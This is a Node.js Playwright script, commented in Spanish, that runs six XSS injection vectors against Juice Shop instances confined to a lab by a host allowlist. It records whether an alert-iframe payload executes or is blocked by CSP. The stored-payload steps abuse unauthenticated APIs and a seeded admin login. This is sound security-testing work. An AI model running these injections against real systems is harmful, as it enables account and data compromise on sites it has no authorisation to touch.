// Prueba de XSS EN NAVEGADOR REAL (Chromium/Playwright) contra instancias PROPIAS del laboratorio (red Docker interna).
// Seis vectores sobre los sumideros que el frontend de Juice Shop pinta con bypassSecurityTrustHtml / [innerHTML]:
//   V1 DOM (búsqueda, ?q=)              V2 reflejado (seguimiento de pedido, ?id=)
//   V3 almacenado: opinión (About)       V4 almacenado: descripción de producto vía PUT /api/Products/:id (búsqueda)
//   V5 almacenado: correo de registro (panel de administración)    V6 almacenado: cabecera True-Client-IP (última IP)
// Veredicto por vector: EJECUTADO (se abrió un diálogo alert), INYECTADO-BLOQUEADO (el iframe javascript: está en el DOM
// pero no se ejecutó, p. ej. por la CSP del WAF) o NO-INYECTADO. Captura de pantalla de cada vector.
// Uso: node xss-navegador.mjs <url-base> <carpeta-salida> [archivo usuario:contraseña de la puerta /__acceso]
// Datos sintéticos; la contraseña del administrador sembrado sale del archivo de semillas de Juice Shop (dato de prueba).
import { chromium } from 'playwright'
import fs from 'node:fs'

const [B, OUT, CRED] = process.argv.slice(2)
const host = new URL(B).hostname
if (!['oficial', 'corregida', 'oficial-sms', 'corregida-sms', 'cloud', '127.0.0.1', 'localhost'].includes(host)) { console.error('FUERA DE ALCANCE', host); process.exit(2) }
fs.mkdirSync(OUT, { recursive: true })
const P = '<iframe src="javascript:alert(`xss`)">'
const TS = Date.now()
const PW = 'Passw0rd!123'
const ADMIN = { email: 'admin@juice-sh.op', password: process.env.ADMIN_PW || '' }

let cookieAcceso = null
async function api (path, opts = {}) {
  const h = { 'Content-Type': 'application/json', ...(opts.headers || {}) }
  if (cookieAcceso) h.Cookie = `lab_acceso=${cookieAcceso}` + (opts.token ? `; token=${opts.token}` : '')
  else if (opts.token) h.Cookie = `token=${opts.token}`
  if (opts.token) h.Authorization = `Bearer ${opts.token}`
  const r = await fetch(B + path, { method: opts.method || 'GET', headers: h, body: opts.body ? JSON.stringify(opts.body) : undefined, redirect: 'manual' })
  let j = null; try { j = await r.json() } catch {}
  return { s: r.status, j }
}
async function login (email, password, extra = {}) {
  const r = await api('/rest/user/login', { method: 'POST', body: { email, password }, headers: extra })
  return r.j?.authentication?.token || null
}

const filas = []
const navegador = await chromium.launch()
// La página solo cuenta si el componente del sumidero llegó a pintarse (esperarSel); si no, el resultado es NO-CONCLUYENTE
// (corrección del 2026-11-24: con waitUntil 'networkidle' las páginas tras el WAF no terminaban de cargar y se contaban
// como «no inyectado»). `accion` abre el elemento que pinta el sumidero (p. ej. el diálogo de detalle de producto).
async function verificar (vector, ruta, token, esperarSel, accion) {
  const ctx = await navegador.newContext()
  const cookies = []
  const u = new URL(B)
  if (cookieAcceso) cookies.push({ name: 'lab_acceso', value: cookieAcceso, domain: u.hostname, path: '/' })
  if (token) cookies.push({ name: 'token', value: token, domain: u.hostname, path: '/' })
  // Banners de bienvenida y de cookies cerrados (si no, tapan los productos y el clic de V4 no abre el detalle)
  for (const n of ['welcomebanner_status', 'cookieconsent_status']) cookies.push({ name: n, value: 'dismiss', domain: u.hostname, path: '/' })
  await ctx.addCookies(cookies)
  if (token) await ctx.addInitScript(t => { try { localStorage.setItem('token', t) } catch {} }, token)
  const page = await ctx.newPage()
  let dialogos = 0; const csp = []
  page.on('dialog', async d => { dialogos++; await d.dismiss().catch(() => {}) })
  page.on('console', m => { if (/Content Security Policy|Refused to/i.test(m.text())) csp.push(m.text().slice(0, 200)) })
  let estado = 'cargada'; let pintado = false
  try {
    await page.goto(B + ruta, { waitUntil: 'domcontentloaded', timeout: 60000 })
    pintado = await page.waitForSelector(esperarSel, { state: 'attached', timeout: 30000 }).then(() => true).catch(() => false)
    if (pintado && accion) pintado = await accion(page)
    await page.waitForTimeout(4000)
  } catch (e) { estado = 'error: ' + String(e).split('\n')[0].slice(0, 80) }
  if (!pintado && estado === 'cargada') estado = `sin el componente ${esperarSel}`
  const inyectados = await page.locator('iframe[src^="javascript:"]').count().catch(() => -1)
  await page.screenshot({ path: `${OUT}/${vector.split(' ')[0]}.png`, fullPage: false }).catch(() => {})
  await ctx.close()
  const veredicto = dialogos > 0 ? 'EJECUTADO' : inyectados > 0 ? 'INYECTADO-BLOQUEADO' : !pintado ? 'NO-CONCLUYENTE' : 'NO-INYECTADO'
  filas.push({ vector, ruta: ruta.slice(0, 60), estado, dialogos, inyectados, csp: csp.length, veredicto, cspTextos: [...new Set(csp)].slice(0, 3) })
  console.log(vector, '→', veredicto, `(diálogos ${dialogos}, iframes ${inyectados}, CSP ${csp.length})`)
}

// Puerta de acceso (solo la imagen cloud)
if (CRED) {
  const [u, p] = fs.readFileSync(CRED, 'utf8').trim().split(/:(.*)/s)
  const r = await fetch(B + '/__acceso', { headers: { Authorization: 'Basic ' + Buffer.from(`${u}:${p}`).toString('base64') }, redirect: 'manual' })
  cookieAcceso = (r.headers.get('set-cookie') || '').match(/lab_acceso=([0-9a-f]+)/)?.[1] || null
  if (!cookieAcceso) { console.error('sin cookie de acceso'); process.exit(3) }
}

// Preparación por API (cuentas sintéticas)
const EM = `xss_u_${TS}@juice-sh.op`
const reg = await api('/api/Users', { method: 'POST', body: { email: EM, password: PW, passwordRepeat: PW, securityQuestion: { id: 1 }, securityAnswer: 'x' } })
const tokU = await login(EM, PW)
const preparacion = { registro_U: reg.s, login_U: tokU ? 'ok' : 'fallo' }
// V3 opinión
const cap = await api('/rest/captcha/', { token: tokU })
const fb = await api('/api/Feedbacks/', { method: 'POST', token: tokU, body: { comment: P, rating: 1, captchaId: cap.j?.captchaId, captcha: cap.j?.answer } })
preparacion.V3_post_opinion = fb.s; preparacion.V3_comentario_guardado = fb.j?.data?.comment ?? null
// V4 producto (sin token: Juice Shop no protege el PUT)
const pu = await api('/api/Products/1', { method: 'PUT', body: { description: P } })
preparacion.V4_put_producto_sin_token = pu.s; preparacion.V4_descripcion_guardada = pu.j?.data?.description ?? null
// V5 correo de registro con el payload (se salta la validación del cliente)
const r5 = await api('/api/Users', { method: 'POST', body: { email: P, password: PW, passwordRepeat: PW } })
preparacion.V5_registro = r5.s; preparacion.V5_email_guardado = r5.j?.data?.email ?? null
// V6 última IP: se guarda con True-Client-IP = payload y se vuelve a iniciar sesión, porque la página la lee del JWT
const s6 = await api('/rest/saveLoginIp', { token: tokU, headers: { 'True-Client-IP': P } })
preparacion.V6_saveLoginIp = s6.s; preparacion.V6_ip_guardada = s6.j?.lastLoginIp ?? null
const tokU2 = await login(EM, PW)
const tokAdmin = ADMIN.password ? await login(ADMIN.email, ADMIN.password) : null
preparacion.login_admin = tokAdmin ? 'ok' : 'fallo'

await verificar('V1 DOM búsqueda', '/#/search?q=' + encodeURIComponent(P), null, '#searchValue')
await verificar('V2 reflejado seguimiento', '/#/track-result?id=' + encodeURIComponent(P), null, 'app-track-result mat-card, app-track-result')
await verificar('V3 almacenado opinión', '/#/about', null, '.feedback')
// V4: la descripción (bypassSecurityTrustHtml en la búsqueda) se pinta en el diálogo de detalle del producto 1
await verificar('V4 almacenado producto', '/#/search', null, 'mat-card', async p => {
  await p.locator('mat-card').first().click({ timeout: 10000 }).catch(() => {})
  return await p.waitForSelector('app-product-details', { state: 'attached', timeout: 15000 }).then(() => true).catch(() => false)
})
await verificar('V5 almacenado correo (admin)', '/#/administration', tokAdmin, 'mat-table, .mat-mdc-table')
await verificar('V6 almacenado última IP', '/#/privacy-security/last-login-ip', tokU2, 'app-last-login-ip dd')
await navegador.close()

const md = [`# XSS en navegador — ${new Date().toISOString()}`, `Objetivo: \`${B}\` · Chromium (Playwright 1.49.1) · payload \`${P}\``, '',
  '## Preparación por API', '```json', JSON.stringify(preparacion, null, 1), '```', '',
  '| Vector | Ruta | Página | Diálogos alert | iframes javascript: en el DOM | Avisos CSP | Veredicto |', '|---|---|---|---|---|---|---|',
  ...filas.map(f => `| ${f.vector} | \`${f.ruta}\` | ${f.estado} | ${f.dialogos} | ${f.inyectados} | ${f.csp} | **${f.veredicto}** |`), '',
  '## Avisos CSP (únicos, primeros 3 por vector)', ...filas.flatMap(f => f.cspTextos.map(t => `- ${f.vector.split(' ')[0]}: ${t}`)), '',
  `**Resultado: ${filas.filter(f => f.veredicto === 'EJECUTADO').length} ejecutados, ${filas.filter(f => f.veredicto === 'INYECTADO-BLOQUEADO').length} inyectados pero bloqueados, ${filas.filter(f => f.veredicto === 'NO-INYECTADO').length} no inyectados.**`]
fs.writeFileSync(`${OUT}/resultados.md`, md.join('\n') + '\n')
console.log(md.slice(-1)[0])
